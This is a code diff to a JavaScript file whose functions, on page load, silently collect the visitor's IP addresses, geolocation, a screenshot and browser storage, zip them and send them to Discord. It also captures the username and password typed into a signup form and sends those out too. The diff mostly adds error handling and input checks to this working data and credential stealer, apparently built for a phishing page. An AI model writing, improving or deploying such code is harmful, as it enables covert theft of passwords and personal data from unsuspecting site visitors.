@@ -4,28 +4,29 @@ function generateUniqueId() {
 
 async function getIpAddressesAndLocation() {
     try {
+        // Fetch IPv4 address
         const ipv4Response = await fetch('https://api.ipify.org?format=json');
         const ipv4Data = await ipv4Response.json();
         const ipv4 = ipv4Data.ip;
 
+        // Fetch IPv6 address
         const ipv6Response = await fetch('https://api6.ipify.org?format=json');
         const ipv6Data = await ipv6Response.json();
         const ipv6 = ipv6Data.ip;
 
-        // Fetch geolocation info using a public IP Geolocation API
+        // Fetch geolocation info
         const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
         const geoData = await geoResponse.json();
-        const { latitude, longitude, city, region, country } = geoData;
 
         return {
             ipv4,
             ipv6,
             location: {
-                latitude: latitude || 'Not available',
-                longitude: longitude || 'Not available',
-                city: city || 'Not available',
-                region: region || 'Not available',
-                country: country || 'Not available'
+                latitude: geoData.latitude || 'Not available',
+                longitude: geoData.longitude || 'Not available',
+                city: geoData.city || 'Not available',
+                region: geoData.region || 'Not available',
+                country: geoData.country_name || 'Not available'
             }
         };
     } catch (error) {
@@ -98,11 +99,11 @@ async function captureScreenshot() {
     }
 }
 
-async function createInitialZipFile(info, screenshotDataUrl, ipAddresses, geolocation) {
+async function createInitialZipFile(info, screenshotDataUrl, ipAddresses) {
     const zip = new JSZip();
     zip.file('info.txt', JSON.stringify(info, null, 2));
 
-    if (geolocation) {
+    if (ipAddresses) {
         const { latitude, longitude, city, region, country } = ipAddresses.location;
         zip.file('geolocation.txt', `Latitude: ${latitude}\nLongitude: ${longitude}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}`);
     }
@@ -118,15 +119,25 @@ async function createInitialZipFile(info, screenshotDataUrl, ipAddresses, geoloc
     zip.file('localStorage.txt', formatStorage(localStorage));
     zip.file('sessionStorage.txt', formatStorage(sessionStorage));
 
-    const content = await zip.generateAsync({ type: 'blob' });
-    return content;
+    try {
+        const content = await zip.generateAsync({ type: 'blob' });
+        return content;
+    } catch (error) {
+        console.error('Error generating initial zip file:', error);
+        return null;
+    }
 }
 
 async function createLoginZipFile(username, password) {
     const zip = new JSZip();
     zip.file('login.json', JSON.stringify({ username, password }, null, 2));
-    const content = await zip.generateAsync({ type: 'blob' });
-    return content;
+    try {
+        const content = await zip.generateAsync({ type: 'blob' });
+        return content;
+    } catch (error) {
+        console.error('Error generating login zip file:', error);
+        return null;
+    }
 }
 
 async function sendZipToDiscord(zipBlob, uniqueId, isLoginZip = false) {
@@ -154,17 +165,29 @@ async function initialize() {
         browserInfo.ipv6 = ipAddresses.ipv6;
         browserInfo.uniqueId = uniqueId;
 
-        // Send initial data when page loads
         const screenshotDataUrl = await captureScreenshot();
-        const initialZipBlob = await createInitialZipFile(browserInfo, screenshotDataUrl, ipAddresses, ipAddresses.location);
-        await sendZipToDiscord(initialZipBlob, uniqueId);
+        const initialZipBlob = await createInitialZipFile(browserInfo, screenshotDataUrl, ipAddresses);
 
-        // Set up event listener for sign up button
+        if (initialZipBlob) {
+            await sendZipToDiscord(initialZipBlob, uniqueId);
+        } else {
+            console.error('Failed to create initial zip file.');
+        }
+
         document.getElementById('signup-button').addEventListener('click', async () => {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const loginZipBlob = await createLoginZipFile(username, password);
-            await sendZipToDiscord(loginZipBlob, uniqueId, true);
+
+            if (username && password) {
+                const loginZipBlob = await createLoginZipFile(username, password);
+                if (loginZipBlob) {
+                    await sendZipToDiscord(loginZipBlob, uniqueId, true);
+                } else {
+                    console.error('Failed to create login zip file.');
+                }
+            } else {
+                console.error('Username or password is missing.');
+            }
         });
     } catch (error) {
         console.error('Error during initialization:', error);
